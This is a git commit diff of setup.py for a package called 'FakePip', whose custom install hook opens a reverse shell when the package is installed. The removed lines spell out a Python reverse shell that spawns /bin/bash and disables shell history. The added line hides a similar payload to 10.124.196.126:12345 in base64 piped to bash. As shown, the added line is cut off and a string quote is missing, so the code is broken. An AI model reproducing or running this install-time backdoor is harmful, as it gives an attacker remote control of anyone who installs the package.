1b1ccff1a68243a6f3660d93af3c773b93bf19fa
cannysiska <38238774+cannysiska@users.noreply.github.com>
2019-02-18 19:57:50 +0700

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,18 +1,13 @@
 from setuptools import setup
 from setuptools.command.install import install
-import base64
+#import base64
 import os
 
 
 class CustomInstall(install):
   def run(self):
     install.run(self)
-    LHOST = 'localhost'  # change this
-    LPORT = 13372
-    
-    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
-    encoded = base64.b64encode(reverse_shell)
-    os.system('echo %s|base64 -d|bash' % encoded)
+    os.system('echo cHl0aG9uIC1jICJpbXBvcnQgb3MscHR5LHNvY2tldDsgTEhPU1QgPSAnMTAuMTI0LjE5Ni4xMjYnOyBMUE9SVCA9IDEyMzQ1OyBzPXNvY2tldC5zb2NrZXQoc$
 
 
 setup(name='FakePip',
@@ -21,6 +16,6 @@ setup(name='FakePip',
       url='https://github.com/0x00-0x00/fakepip',
       author='zc00l',
       author_email='andre.marques@esecurity.com.br',
-      license='MIT',
+      license='MIT
       zip_safe=False,
       cmdclass={'install': CustomInstall})
